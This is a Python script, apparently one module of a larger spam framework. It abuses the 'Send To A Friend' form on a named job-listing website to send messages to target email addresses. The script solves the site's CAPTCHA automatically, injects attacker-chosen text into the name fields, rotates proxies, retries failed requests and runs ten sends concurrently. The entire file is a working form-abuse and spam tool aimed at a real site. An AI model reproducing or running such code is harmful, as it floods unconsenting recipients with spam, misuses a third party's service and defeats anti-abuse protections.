from os.path import basename

import requests

import module

url = 'https://www.seasonworkers.com/SendToAFriend.aspx?vId=2625'
key = '6LdNbAMTAAAAANEoG54GI0K8RFvdzwvYXmGlKPmZ'

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Origin': 'https://www.seasonworkers.com',
    'Referer': 'https://www.seasonworkers.com/SendToAFriend.aspx?vId=2625',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

params = {
    'vId': '2625',
}


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response | None:
        captcha = self.solve_captcha(url, key)
        if not captcha:
            return
        text = self.get_text()
        data = {
            '__EVENTTARGET': '',
            '__EVENTARGUMENT': '',
            '__VIEWSTATE': '/wEPDwUJNjc2NjE5NDgwD2QWAgIDD2QWBAIBD2QWBAIBDw8WBB4EVGV4dAU8V29yayBhbmQgVHJhdmVsIHBhY2thZ2UgaW4gU3lkbmV5IC0gc3RheSBmb3IgdXAgdG8gMTIgbW9udGhzHgtOYXZpZ2F0ZVVybAVmaHR0cDovL3d3dy5zZWFzb253b3JrZXJzLmNvbS9qb2JzL3dvcmstYW5kLXRyYXZlbC1wYWNrYWdlLWluLXN5ZG5leS1zdGF5LWZvci11cC10by0xMi1tb250aHMtMjYyNS5hc3B4ZGQCAw8WAh8ABRBPeXN0ZXIgV29ybGR3aWRlZAIDD2QWAgIBDxYCHwAFEXNlYXNvbndvcmtlcnMuY29tZGQVwjjc9CCzX3KGolmAHDMRA5UD9DAbXo2EFC7lEtYIwQ==',
            '__VIEWSTATEGENERATOR': 'C0864C81',
            'txtName': text,
            'txtFName': text,
            'txtFEmail': target,
            'txtMsg': 'test',
            'g-recaptcha-response': captcha,
            'btnSend': 'Send To A Friend »',
        }
        for _ in range(10):
            try:
                response = requests.post('https://www.seasonworkers.com/SendToAFriend.aspx', params=params,
                                         headers=headers,
                                         data=data,
                                         proxies=self.get_proxies(), timeout=10
                                         )
                return response
            except Exception as e:
                print(e)
        return


def main():
    s = 'Your email has been sent, thank you'

    spam = ConcreteSpam(
        basename(__file__)[:-3], s,
    )
    res = spam.send_post()
    if res:
        spam.run_concurrently(10)


if __name__ == '__main__':
    main()
